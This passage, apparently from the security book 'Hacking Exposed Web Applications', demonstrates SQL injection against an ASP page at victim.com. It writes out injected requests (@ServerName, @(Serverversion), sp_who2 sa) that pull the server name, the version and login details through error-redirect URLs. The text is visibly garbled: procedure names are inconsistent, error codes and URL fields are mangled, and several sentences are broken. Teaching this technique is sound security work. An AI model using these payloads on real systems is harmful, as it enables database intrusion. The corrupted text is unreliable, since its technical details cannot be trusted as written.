# Hacking Exposed Web Applications

Once, we are foiled by a strong policy. A better policy for the server would have removed many of the stored procedures that we have been accessing.
Here are more examples that demonstrate how to manipulate an application's error-handling routine. The DataList.asp file is vulnerable to SQL injection. However, a casual observer might miss this fact because the HTML output displays a custom-error page, the text of which reads:

The database encountered an error.    Please inform the system administrator.

However, if we actually examine the error redirect, then we notice that the parameters to the GET request contain the raw ODBC error. Here is a request:

```
https://www.victim.com/DataList.asp?Page=1&PageName=@ServerName --n
and the Error file to which the application directs us:

https://www.victim.com/Error.asp?log=True&ec=4n&en=
```

```
214721900&Could=not+find+stored+procedure=%27VENONASQLA12%27%2E
es=Microsoft+OLE+DB+Provider+for+SQL+Server&pn=RL2&Inc&fn=ExecuteSP
```

The initial request combined three techniques: the (--), a default SQL procedure (@ServerName), and nested procedures (wrapped in parentheses). The SQL injection worked, but its results are not where we expect them. Take a look at the "ed" in the redirected URL. If we use the URL encoding, the correlation is readily apparent:

```
ed=Could not find procedure VENONASQLA12'
```

We have managed to execute a stored procedure, even though the application's SQL query injection, @@ServerName, the server interprets it, then tries to insert the procedure to which it was variable. Thus, that VENONASQLA12 is the server name where the SQL database resides. Here are two more examples of exploiting the error string:

```
Sent -- https://www.victim.com/DataList.asp?Page=1&PageName=@(Serverversion) -- Received
https://www.victim.com/Error.asp?log=True&ec=4n&en=2147219000
Line=13+Insert+with+syntax=%27314122862%27%2E
es=Microsoft+OLE+DB+Provider+for+SQL+Server&pn=RL2&Inc&fn=ExecuteSP
```

```
Sent -- https://www.victim.com/DataList.asp?Page=2&PageName=sp_who2+sa
Received -- https://www.victim.com/Error.asp?log=True&ec=4n&en=2147219000
edThe=Login+%27s%40%27+does+not+exist%2E&es=Microsoft+OLE+DB+Provider+for+SQL+Server&pn=RL2&Inc&fn=ExecuteSP
```
